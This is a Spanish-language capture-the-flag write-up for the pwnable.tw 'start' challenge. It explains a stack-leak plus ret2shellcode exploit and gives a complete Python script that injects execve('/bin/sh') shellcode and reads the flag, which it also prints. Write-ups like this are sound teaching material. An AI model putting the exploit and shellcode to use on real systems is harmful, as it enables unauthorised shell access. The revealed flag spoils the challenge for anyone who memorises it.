# start
```
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Code
```asm
/ 61: entry0 ();
|           0x08048060      54             push esp                    ; [01] -r-x section size 67 named .text
|           0x08048061      689d800408     push loc._exit              ; 0x804809d ; "\1\xc0@\u0340" ; int status
|           0x08048066      31c0           xor eax, eax
|           0x08048068      31db           xor ebx, ebx
|           0x0804806a      31c9           xor ecx, ecx
|           0x0804806c      31d2           xor edx, edx
|           0x0804806e      684354463a     push 0x3a465443             ; 'CTF:'
|           0x08048073      6874686520     push 0x20656874             ; 'the '
|           0x08048078      6861727420     push 0x20747261             ; 'art '
|           0x0804807d      6873207374     push 0x74732073             ; 's st'
|           0x08048082      684c657427     push 0x2774654c             ; 'Let\''
|           0x08048087      89e1           mov ecx, esp
|           0x08048089      b214           mov dl, 0x14                ; 20
|           0x0804808b      b301           mov bl, 1
|           0x0804808d      b004           mov al, 4
|           0x0804808f      cd80           int 0x80
|           0x08048091      31db           xor ebx, ebx
|           0x08048093      b23c           mov dl, 0x3c                ; '<' ; 60
|           0x08048095      b003           mov al, 3
|           0x08048097      cd80           int 0x80
|           0x08048099      83c414         add esp, 0x14
\           0x0804809c      c3             ret
```

El programa no tiene ninguna protección, podemos escribir shellcode en el stack y ejecutarlo. Primero necesitamos una direccion de la pila para retornar a nuestro shellcode. Podemos reutilizar la syscall `write` del programa para filtrarla. Calculamos el desplazamiento de nuestro shellcode y hacemos un ret2shellcode:
```py
import socket, struct

payload = b"A"*20
payload += struct.pack("<I", 0x08048087)

shellcode = b""
shellcode += b"1\xd2" # xor edx,edx
# https://shell-storm.org/shellcode/files/shellcode-827.html
shellcode += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw",10000))
print(s.recv(100))

s.send(payload)
stack_leak = struct.unpack("<I",s.recv(4))[0]
print(s.recv(100))

payload = b"A"*20 + struct.pack("<I", stack_leak+20) + shellcode
s.send(payload)
s.send(b"cat /home/start/flag\n")
print(s.recv(100))
```

`FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}`
